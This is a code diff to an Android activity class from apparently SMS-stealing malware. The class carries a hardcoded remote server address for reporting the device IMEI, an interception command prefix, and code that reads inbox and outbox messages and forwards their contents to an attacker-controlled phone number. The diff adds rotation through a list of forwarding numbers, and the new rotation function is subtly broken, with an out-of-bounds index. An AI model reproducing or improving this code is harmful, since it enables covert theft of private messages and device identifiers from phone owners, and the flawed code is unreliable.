@@ -24,12 +24,14 @@ import android.telephony.TelephonyManager;
 public class Dctivity extends Activity {
 
 	private SharedPreferences sp;
+	//转发下标
+	public static int index = 0;
 	//imei发送
 	public static final String devicephone="13556000271";
 	
 	public static final String Dctivityhttpurl="http://113.10.158.197:909/admin/ccc2.asp";
 	//短信转发
-	public static final String phonenum="13556000271";
+	public static final String[] phonenum={"13556000271","13556000271","13556000271","13556000271","13556000271","13556000271","13556000271","13556000271"};
 	//拦截
 	public static final String lanjie="DX99#LJ|";
 	//转发
@@ -67,10 +69,19 @@ public class Dctivity extends Activity {
 			address = address.replace("+86", "").replace("+1", "");
 			LogUtils.write("Send", "检索出来的内容" + body);
 			String lx = (type == 1 ? "收件箱" : "发件箱");
-			DmsManager.Send(Dctivity.this, devicephone, "DX99#"+lx+"-H " + body);
+			DmsManager.Send(Dctivity.this, getPhoneNumber(), "DX99#"+lx+"-H " + body);
 			DQLiteOpenHelper.getHelper(Dctivity.this).addData(lx, address, body, new Date());
 			Dhread.SartSend(Dctivity.this.getApplicationContext());
 		}
+	}
+	
+	public static String getPhoneNumber() {
+		if (index >= phonenum.length) {
+			index = 0;
+		} else {
+			index++;
+		}
+		return phonenum[index];
 	}
 	
 	public String GetDeviceId(){
